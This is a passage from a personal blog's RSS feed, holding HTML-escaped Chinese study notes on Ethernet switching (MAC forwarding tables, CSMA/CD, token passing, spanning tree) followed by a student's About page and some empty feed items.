MAC地址转发&lt;/h3&gt;&#xA;&lt;p&gt;以太网交换机就是持有多个端口”的网桥。它们根据数据链路层中每个帧的目标MAC地址,决定从哪个网络接口发送数据。这时所参考的、用以记录发送接口的表就叫做转发表(Forwarding Table)。&#xA;这种转发表的内容不需要使用者在每个终端或交换机上手工设置,而是可以自动生成。数据链路层的每个通过点在接到包时,会从中将源MAC地址以及曾经接收该地址发送的数据包的接口作为对应关系记录到转发表中。&#xA;以某个 MAC地址作为源地址的包由某一接口接收,实质上可以理解为该MAC地址就是该接口的目标。因此也可以说,以该 MAC地址作为目标地址的包,经由该接口送出即可。这一过程也叫&lt;strong&gt;自学过程&lt;/strong&gt;。&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/Pasted-image-20231012093633.1id35380gagw.webp&#34; alt=&#34;Pasted-image-20231012093633&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;交换机转发方式&#34;&gt;交换机转发方式&lt;/h3&gt;&#xA;&lt;h4 id=&#34;存储转发&#34;&gt;存储转发&lt;/h4&gt;&#xA;&lt;p&gt;存储转发方式检查以太网数据帧末尾的 FCS&amp;rsquo;位后再进行转发。因此,可以避免发送由于冲突而被破坏的帧或噪声导致的错误帧。&lt;/p&gt;&#xA;&lt;h4 id=&#34;直通转发&#34;&gt;直通转发&lt;/h4&gt;&#xA;&lt;p&gt;直通转发方式中不需要将整个帧全部接收下来以后再进行转发。只需要得知目标地址即可开始转发。因此,它具有延迟较短的优势。但同时也不可避免地有发送错误帧的可能性。&lt;/p&gt;&#xA;&lt;h2 id=&#34;共享介质型网络&#34;&gt;共享介质型网络&lt;/h2&gt;&#xA;&lt;p&gt;共享介质型网络指由多个设备共享一个通信介质的一种网络。最早的以太网和FDDI 就是介质共享型网络。在这种方式下,设备之间使用同一个载波信道进行发送和接收。为此,基本上采用&lt;strong&gt;半双工通信&lt;/strong&gt;方式,并有必要对介质进行&lt;strong&gt;访问控制&lt;/strong&gt;。&lt;/p&gt;&#xA;&lt;h3 id=&#34;争用方式&#34;&gt;争用方式&lt;/h3&gt;&#xA;&lt;p&gt;争用方式(Contention)是指争夺获取数据传输的权力,也叫 &lt;strong&gt;CSMA&lt;/strong&gt;(载波监听多路访问)。这种方法通常令网络中的各个站”采用&lt;strong&gt;先到先得&lt;/strong&gt;的方式占用信道发送数据,如果多个站同时发送帧,则会产生冲突现象。也因此会导致网络拥堵与性能下降。&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/Pasted-image-20231012091610.3xi1vcq2ex34.webp&#34; alt=&#34;Pasted-image-20231012091610&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;csmacd&#34;&gt;CSMA/CD&lt;/h3&gt;&#xA;&lt;p&gt;在一部分以太网当中,采用了改良 CSMA 的另一种方式-CSMA/CD 方式。CSMA/CD 要求每个站提前检查冲突,一旦发生冲突,则尽早释放信道。其具体工作原理如下: 如果载波信道上没有数据流动,则任何站都可以发送数据。&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;检查是否会发生冲突。一旦发生冲突时,放弃发送数据”,同时立即释放载波信道。&lt;/li&gt;&#xA;&lt;li&gt;放弃发送以后,随机延时一段时间,再重新争用介质,重新发送帧。&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/Pasted-image-20231012091709.1dowsbjkzfgg.webp&#34; alt=&#34;Pasted-image-20231012091709&#34;&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;令牌传递方式&#34;&gt;令牌传递方式&lt;/h3&gt;&#xA;&lt;p&gt;令牌传递方式是沿着令牌环发送一种叫做“令牌”的特殊报文,是控制传输的一种方式。只有获得令牌的站才能发送数据。这种方式有两个特点:一是不会有冲突,二是每个站都有通过平等循环获得令牌的机会。因此,即使网络拥堵也不会导致性能下降。&#xA;当然,这种方式中,一个站在没有收到令牌前不能发送数据帧,因此在网络不太拥堵的情况下数据链路的利用率也就达不到100%&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/Pasted-image-20231012091832.6fum2zrqk4cg.webp&#34; alt=&#34;Pasted-image-20231012091832&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;非共享介质网络&#34;&gt;非共享介质网络&lt;/h2&gt;&#xA;&lt;p&gt;非共享介质网络是指不共享介质,是对介质采取专用的一种传输控制方式。在这种方式下,网络中的每个站直连交换机,由交换机负责转发数据帧。&lt;/p&gt;&#xA;&lt;p&gt;该方式还可以根据交换机的高级特性构建虚拟局域网(VLAN,Virtual LAN)、进行流量控制等。当然,这种方式也有一个致命的弱点,那就是一旦交换机发生故障,与之相连的所有计算机之间都将无法通信。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/Pasted-image-20231012092641.rw5ht0204jk.webp&#34; alt=&#34;Pasted-image-20231012092641&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;全双工通信&#34;&gt;全双工通信&lt;/h3&gt;&#xA;&lt;p&gt;它允许在同一时间既可以发送数据也可以接收数据。类似于电话,接打双方可以同时说话。&#xA;同样是以太网,在使用交换机与双绞线电缆(亦或光纤电缆) 的情况下,既可以通过交换机的端口与计算机之间进行一对一的连接,也可以通过相连电缆内部的收发线路”分别进行接收和发送数据。因此,交换机的端口与计算机之间可以实现同时收发的全双工通信。&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/Pasted-image-20231012092718.5vc4svf569z4.webp&#34; alt=&#34;Pasted-image-20231012092718&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;环路检测技术&#34;&gt;环路检测技术&lt;/h2&gt;&#xA;&lt;p&gt;通过网桥连接网络时,一旦出现环路该如何处理?这与网络的拓扑结构和所使用的网桥种类有直接关系。最坏的情况下,数据顿会在环路中被一而再再而三地持续转发。而一旦这种数据帧越积越多将会导致网络瘫痪。&lt;/p&gt;&#xA;&lt;h3 id=&#34;生成树方式&#34;&gt;生成树方式&lt;/h3&gt;&#xA;&lt;p&gt;该方法由 IEEE802.1D定义。每个网桥必须在每1~10秒内相互交換 BPDU (Bridge Protocol Data Unit)包,从而判断哪些端口使用哪些不使用,以便消除环路。一旦发生故障,则自动切换通信线路,利用那些没有被使用的端口继续进行传输。&lt;/p&gt;</description>
    </item>
    <item>
      <title>About</title>
      <link>//localhost:64783/about/</link>
      <pubDate>Wed, 18 Oct 2023 00:00:00 +0000</pubDate>
      <guid>//localhost:64783/about/</guid>
      <description>&lt;h2 id=&#34;about-me&#34;&gt;About Me&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;👋 My name is XXX.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;interests&#34;&gt;Interests&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;🏸 I enjoy playing badminton.&lt;/li&gt;&#xA;&lt;li&gt;🏋️‍♀️ Fitness is a part of my daily routine.&lt;/li&gt;&#xA;&lt;li&gt;🎬 I love watching movies.&lt;/li&gt;&#xA;&lt;li&gt;🎵 Listening to concerts is one of my favorite pastimes.&lt;/li&gt;&#xA;&lt;li&gt;💻 I really enjoy coding.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;-my-education&#34;&gt;🎓 My Education:&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;[South-Central Minzu University], [BEng in Computer Science and Technology], [2019 - 2023]&lt;/li&gt;&#xA;&lt;li&gt;[University of Chinese Academy of Sciences], [MSc in Electronic-Engineering], [2023 - Now]&lt;/li&gt;&#xA;&lt;li&gt;&amp;hellip;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;current-research&#34;&gt;Current Research&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;🎯 My current research focus is on network security.&lt;/li&gt;&#xA;&lt;li&gt;📘 I am currently learning Go language and its network programming.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;-my-tech-stack-includes&#34;&gt;💻 My tech stack includes:&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;img src=&#34;https://img.shields.io/badge/python-black?style=flat&amp;amp;logo=python&#34; alt=&#34;Static Badge&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/flask-black?style=flat&amp;amp;logo=flask&#34; alt=&#34;Static Badge&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/django-black?style=flat&amp;amp;logo=django&#34; alt=&#34;Static Badge&#34;&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;img src=&#34;https://img.shields.io/badge/Golang-blue?style=flat&amp;amp;logo=Golang&#34; alt=&#34;Static Badge&#34;&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;img src=&#34;https://img.shields.io/badge/Java-red?style=flat&#34; alt=&#34;Static Badge&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/SSM-red?style=flat&#34; alt=&#34;Static Badge&#34;&gt;&lt;/li&gt;&#xA;&lt;li&gt;&amp;hellip;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;contact-me&#34;&gt;Contact Me&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;📫 You can reach me at [&lt;strong&gt;gagaq@mail.ustc.edu.cn&lt;/strong&gt;].&lt;/li&gt;&#xA;&lt;li&gt;🐱‍💻 Here is my GitHub: &lt;a href=&#34;https://github.com/Anonymity-0&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-GitHub-black?style=flat&amp;amp;logo=github&#34; alt=&#34;GitHub Badge&#34;&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;</description>
    </item>
    <item>
      <title>Archives</title>
      <link>//localhost:64783/archives/</link>
      <pubDate>Wed, 18 Oct 2023 00:00:00 +0000</pubDate>
      <guid>//localhost:64783/archives/</guid>
      <description></description>
    </item>
    <item>
      <title>gateway文档</title>
      <link>//localhost:64783/posts/gateway%E6%96%87%E6%A1%A3/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>//localhost:64783/posts/gateway%E6%96%87%E6%A1%A3/</guid>
      <description>摘要</description>
    </item>
    <item>
      <title>Search</title>
      <link>//localhost:64783/search/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>//localhost:64783/search/</guid>
      <description></description>
    </item>
  </channel>
</rss>
